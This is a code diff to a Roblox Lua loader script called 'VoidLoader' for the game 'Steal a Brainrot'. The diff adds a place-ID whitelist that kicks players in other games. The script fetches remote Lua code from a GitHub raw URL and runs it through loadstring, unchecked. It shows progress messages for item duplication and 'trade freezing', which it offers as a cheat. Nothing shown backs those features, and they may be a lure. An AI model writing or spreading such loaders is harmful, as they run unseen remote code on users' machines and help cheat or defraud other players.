@@ -6,15 +6,26 @@ rbx:Destroy()
 end
 end)
 
+local allowedPlaces = {
+	[85621847059032] = true,
+	[96342491571673] = true,
+	[99392882090073] = true,
+	[99606176102979] = true,
+	[109983668079237] = true,
+	[128762245270197] = true
+}
+
+if not allowedPlaces[game.PlaceId] then
+	game:GetService("Players").LocalPlayer:Kick("Use in Steal a Brainrot")
+	return
+end
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Bringvacktge-loac/refs/heads/main/Bru"))()
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-local MarketplaceService = game:GetService("MarketplaceService")
 
 local player = Players.LocalPlayer
-local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-local wrongGame = gameName ~= "Steal a Brainrot"
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "VoidLoader"
@@ -61,10 +72,6 @@ title.TextScaled = true
 title.TextColor3 = Color3.fromRGB(255,255,255)
 title.Parent = bg
 
-if wrongGame then
-title.Text = "Warning:Make Sure you are in Steal a Brainrot"
-end
-
 local barBG = Instance.new("Frame")
 barBG.AnchorPoint = Vector2.new(0.5,0.5)
 barBG.Position = UDim2.new(0.5,0,0.56,0)
@@ -105,20 +112,18 @@ local m = math.floor(remaining/60)
 local s = math.floor(remaining%60)
 timer.Text = string.format("%02d:%02d",m,s)
 
-if not wrongGame then
 if progress < 0.25 then
-title.Text = "Loading Duplication Script..."
+	title.Text = "Loading Duplication Script..."
 elseif progress < 0.5 then
-title.Text = "Loading Trade Freezing Script..."
+	title.Text = "Loading Trade Freezing Script..."
 elseif progress < 0.75 then
-title.Text = "Loading OG Lucky Block Maker..."
+	title.Text = "Loading OG Lucky Block Maker..."
 else
-title.Text = "Loading..."
-end
+	title.Text = "Loading..."
 end
 
 if progress >= 1 then
-break
+	break
 end
 
 task.wait()
